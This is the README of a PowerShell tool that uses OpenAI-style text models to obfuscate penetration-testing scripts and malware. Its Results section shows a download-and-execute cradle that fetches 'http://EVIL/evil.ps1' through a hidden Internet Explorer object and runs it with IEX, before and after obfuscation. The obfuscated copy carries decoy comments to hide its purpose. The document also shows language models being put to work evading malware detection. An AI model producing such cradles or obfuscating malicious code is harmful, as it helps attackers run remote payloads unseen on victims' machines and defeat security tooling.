# Invoke-GPTObfuscation
Invoke-GPTObfuscation is a PowerShell Obfuscator that utilizes OpenAI or compatible text-completion models to obfuscate your PowerShell penetration testing code, malware, or any other sensitive script. For Educational & Research purposes only.

This is mostly demonstrational, and will frequently create invalid code. You'll need to come up with a better prompt to get good results. If you make any improvements, please consider submitting a pull request!

---

## Credits
### Author: Hunter Watson
### Original Repo: https://github.com/hwvs/Invoke-GPTObfuscation
### License: Mozilla Public License 2.0

---

## Usage

Run the CLI tool (in a powershell window): `./Invoke-GPTObfuscation.ps1`

Use the module in your code
```powershell
# load the module however is easiest for you, eg:
$module_path = $pwd.Path + "/Invoke-GPTObfuscation.psm1"
Invoke-Expression (Get-Content $module_path -Raw)
  
#...

$script_obfuscated = Invoke-GPTObfuscation -ScriptBlock $script -PromptTemplateFile $prompt_template_path -Verbose $true
```

---

## Results 

Before:
```powershell
$ie=New-Object -comobject InternetExplorer.Application;
$ie.visible=$False;
$ie.navigate('http://EVIL/evil.ps1');
start-sleep -s 5;
$r=$ie.Document.body.innerHTML;
$ie.quit();
IEX $r
```

After:
```powershell
# generating Log files
$Strawberry = New-Object -CoMObjEcT inTErnETeXPLOreR.Application;
$strawberry.vISiblE = $fAlSe;
$STRaWbeRRy.NAVigatE('HttP://evIl/evil.ps1');
stArT-SlEEp -s 5;

# Updating log directory path
$r = $StrawberrY.DoCument.BoDy.InneRHTML;

# Cleanup
$strawBerRy.quiT();

# Execute payload
IeX $R
```
*(Note: This result was cherry-picked)*
